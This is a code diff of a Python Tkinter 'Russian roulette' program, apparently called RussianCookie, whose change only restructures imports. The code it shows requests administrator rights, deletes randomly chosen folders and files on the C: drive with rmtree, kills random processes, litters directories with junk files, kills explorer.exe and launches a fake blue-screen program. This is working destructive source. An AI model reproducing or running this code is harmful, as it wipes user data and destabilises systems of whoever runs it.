@@ -1,22 +1,34 @@
-import os, ctypes, sys, random, glob, shutil, string, webbrowser, simpleaudio, pyautogui, psutil, signal, json
+import os
+from ctypes import windll
+from string import printable
+from glob import glob
+from simpleaudio import WaveObject
+from json import load, dump
+from random import choice, randint, random
+from psutil import process_iter
+from signal import SIGBREAK
+from webbrowser import open_new
+from shutil import rmtree
+from sys import executable, argv
+from pyautogui import hotkey
 from cryptography.fernet import Fernet
 from tkinter import *
     
 
-if ctypes.windll.shell32.IsUserAnAdmin():
+if windll.shell32.IsUserAnAdmin():
     
     def rndFile(folder=False, file=False):
         
         percent_to_continue = 0
-        # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
+        # path = choice(psutil.disk_partitions())[0].replace("\\", "")
         path = "C:"
         
         while True:
             
-            try: path = random.choice(glob.glob(f"{path}/*"))
+            try: path = choice(glob(f"{path}/*"))
             except:
                 percent_to_continue = 0
-                # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
+                # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                 path = "C:"
                 continue
             
@@ -24,7 +36,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
                 
                 if len(path) == 0:
                     percent_to_continue = 0
-                    # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
+                    # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                     path = "C:"
                     continue
                 
@@ -35,7 +47,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
                         else: 0 / 0
                     except:
                         percent_to_continue = 0
-                        # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
+                        # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                         path = "C:"
                         continue
                 
@@ -48,7 +60,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
                     else: 0 / 0
                 except:
                     percent_to_continue = 0
-                    # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
+                    # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                     path = "C:"
                     continue
         
@@ -61,7 +73,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
                 if not "Russian" in path:
                 
                     if os.path.isdir(path):
-                        shutil.rmtree(path)
+                        rmtree(path)
                         path = path.replace('/', '\\')
                         return f"Folder deleted : {path}"
                     else: 
@@ -99,13 +111,13 @@ if ctypes.windll.shell32.IsUserAnAdmin():
             try:       
                 process_dict = {}
     
-                for p in psutil.process_iter(): process_dict[p.pid] = p.name()
+                for p in process_iter(): process_dict[p.pid] = p.name()
                 
-                k = random.choice(list(process_dict.keys()))
+                k = choice(list(process_dict.keys()))
                 
                 if process_dict[k] not in ["svchost.exe", "gui.exe"]:
-                    os.kill(k, signal.SIGBREAK)  
-                    return f"process stopped : {process_dict[k]}"
+                    os.kill(k, SIGBREAK)  
+                    return f"Process stopped : {process_dict[k]}"
                     
             except: continue
           
@@ -128,10 +140,10 @@ if ctypes.windll.shell32.IsUserAnAdmin():
             try:
             
                 name = ""
-                for i in range(random.randint(1, 10)): name += random.choice(string.printable)
+                for i in range(randint(1, 10)): name += choice(printable)
                     
                 ext = ""
-                for i in range(2, 5): ext += random.choice(string.printable)
+                for i in range(2, 5): ext += choice(printable)
                     
                 with open(f"{path}/{name}.{ext}", "w+") as f: f.write(f"{str(name) * 100}\n")
                 
@@ -142,7 +154,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
                 
     def Bsod():
         os.system("taskkill /f /im explorer.exe")
-        pyautogui.hotkey("win", "d")
+        hotkey("win", "d")
         os.startfile("BSoD.exe")
         window.destroy()
         
@@ -170,7 +182,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         
         settings["save_settings"][k] = save_settings[k].get()
             
-        with open("scripts/settings.json", "w") as j: json.dump(settings, j, indent=4)
+        with open("scripts/settings.json", "w") as j: dump(settings, j, indent=4)
            
     def ClosePopup():
         
@@ -178,7 +190,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         
         settings["first_start"] = False
         
-        with open("scripts/settings.json", "w") as f: json.dump(settings, f, indent=4)
+        with open("scripts/settings.json", "w") as f: dump(settings, f, indent=4)
         
         link.destroy()
         LoadApp()
@@ -193,7 +205,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         menu = Menu(window, tearoff=0)
         window.config(menu=menu)
         menu.add_command(label="Settings", command=LoadSettings)
-        menu.add_command(label="About...", command=lambda: webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie"))
+        menu.add_command(label="About...", command=lambda: open_new("https://github.com/BOuletteRusSe/RussianCookie"))
 
     def LoadSettings():
         
@@ -270,7 +282,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
     window.minsize(ww, wh)
     
     with open("scripts/settings.json", "r") as j: 
-        settings = json.load(j)
+        settings = load(j)
     save_settings = dict(settings["save_settings"])
     first_start = bool(settings["first_start"])
     
@@ -287,9 +299,9 @@ if ctypes.windll.shell32.IsUserAnAdmin():
     
     menu = Menu(window, tearoff=0)
     window.config(menu=menu)
-    menu.add_command(label="About...", command=lambda: webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie"))
+    menu.add_command(label="About...", command=lambda: open_new("https://github.com/BOuletteRusSe/RussianCookie"))
     
-    shot_audio = simpleaudio.WaveObject.from_wave_file("assets/shot.wav")
+    shot_audio = WaveObject.from_wave_file("assets/shot.wav")
     gun = PhotoImage(file="assets/gun.png")
     gunshot = PhotoImage(file="assets/gunshot.png")
     gun_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=onClick, relief=FLAT, image=gun, borderwidth=0, cursor="hand2")
@@ -332,7 +344,7 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         main_canvas.create_window(mcw/2, mch/2-125, window=sl)
         main_canvas.create_window(mcw/2, mch/2+175, window=ok_button)
         link.place(x=mcw/1.3836477987421383647798742138365, y=mch/3.4951456310679611650485436893204)
-        link.bind("<Button-1>", lambda e: webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie"))
+        link.bind("<Button-1>", lambda e: open_new("https://github.com/BOuletteRusSe/RussianCookie"))
         link.lift()
            
     while True:
@@ -354,4 +366,4 @@ if ctypes.windll.shell32.IsUserAnAdmin():
             
         except: break
 
-else: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
+else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)
